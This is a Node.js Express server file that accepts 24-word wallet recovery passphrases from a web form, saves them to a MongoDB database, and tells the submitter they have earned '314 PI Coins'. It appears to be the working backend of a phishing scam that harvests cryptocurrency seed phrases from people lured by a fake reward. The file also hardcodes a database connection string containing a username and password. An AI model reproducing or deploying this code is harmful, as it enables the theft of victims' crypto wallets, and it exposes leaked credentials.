const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

// Create Express app
const app = express();

// Middleware to parse incoming requests
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// MongoDB Connection
const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
mongoose
    .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.error('MongoDB connection error:', err));

// Define Mongoose Schema and Model
const PassphraseSchema = new mongoose.Schema({
    passphrase: { type: String, required: true }
});
const Passphrase = mongoose.model('Passphrase', PassphraseSchema);

// POST Route to handle form submission
app.post('/submit', async (req, res) => {
    const { passphrase } = req.body;

    // Check if passphrase is 24 words
    if (!passphrase || passphrase.trim().split(" ").length !== 24) {
        return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
    }

    try {
        // Save passphrase to database
        const newPassphrase = new Passphrase({ passphrase });
        await newPassphrase.save();
        
        // Send a styled success message
        const successMessage = `
            <html>
                <head>
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            text-align: center;
                            padding: 50px;
                        }
                        .success-message {
                            font-size: 24px;
                            font-weight: bold;
                            color: green;
                            background-color: blue;
                            padding: 20px;
                            border-radius: 10px;
                            text-transform: uppercase;
                            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
                        }
                    </style>
                </head>
                <body>
                    <div class="success-message">
                        Congratulations!!! You have earned your 314 PI Coins Successfully!!
                    </div>
                </body>
            </html>
        `;
        res.status(200).send(successMessage);
    } catch (error) {
        console.error('Error saving passphrase:', error);
        res.status(500).send('Failed to save passphrase.');
    }
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
